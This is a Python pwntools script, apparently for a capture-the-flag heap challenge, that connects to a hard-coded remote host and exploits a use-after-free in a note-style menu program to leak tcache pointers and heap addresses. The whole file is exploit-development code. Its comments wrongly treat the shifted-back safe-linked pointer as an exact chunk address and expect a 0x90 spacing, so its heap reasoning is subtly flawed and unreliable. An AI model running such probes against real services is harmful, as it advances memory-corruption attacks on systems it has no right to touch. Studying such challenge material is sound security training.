#!/usr/bin/env python3
"""Probe to understand heap layout"""
from pwn import *

context.log_level = 'info'

def connect():
    return remote('52.76.96.108', 9005)

def create(p, idx, size, data):
    p.sendline(b'1')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data: ')
    p.send(data)

def edit(p, idx, size, data):
    p.sendline(b'2')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    p.send(data)

def banish(p, idx):
    p.sendline(b'3')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())

def recite(p, idx, size):
    p.sendline(b'4')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    data = p.recv(size)
    p.recv(1)
    return data

p = connect()
p.recvuntil(b'> ')

# Create ONE spell, banish, read UAF
# If tcache was empty, fd = spell_addr >> 12
print("[*] Single spell test")
create(p, 0, 0x80, b'X' * 0x7f + b'\n')
banish(p, 0)
data = recite(p, 0, 0x80)
fd = u64(data[0:8])
key = u64(data[8:16])
spell_addr = fd << 12
print(f"  fd = {hex(fd)}")
print(f"  spell_addr = {hex(spell_addr)}")

# Now create another spell - should be at a different address
# Actually, create + banish again to get a second address
print("\n[*] Second spell test")
create(p, 1, 0x80, b'Y' * 0x7f + b'\n')
banish(p, 1)
data = recite(p, 1, 0x80)
fd2 = u64(data[0:8])
spell2_addr = fd2 << 12
print(f"  fd = {hex(fd2)}")
print(f"  spell2_addr = {hex(spell2_addr)}")
print(f"  diff (spell2 - spell1) = {hex(spell2_addr - spell_addr)}")
print(f"  diff should be 0x90 (chunk size)")

# If diff is not 0x90, there's something else on the heap
# Let's try allocating with different sizes to see spacing
print("\n[*] Allocating at different indices (same size)")
for idx in range(2, 6):
    create(p, idx, 0x80, b'Z' * 0x7f + b'\n')
    banish(p, idx)
    data = recite(p, idx, 0x80)
    fd = u64(data[0:8])
    addr = fd << 12
    print(f"  idx {idx}: addr = {hex(addr)}, diff from first = {hex(addr - spell_addr)}")

p.sendline(b'0')
p.close()
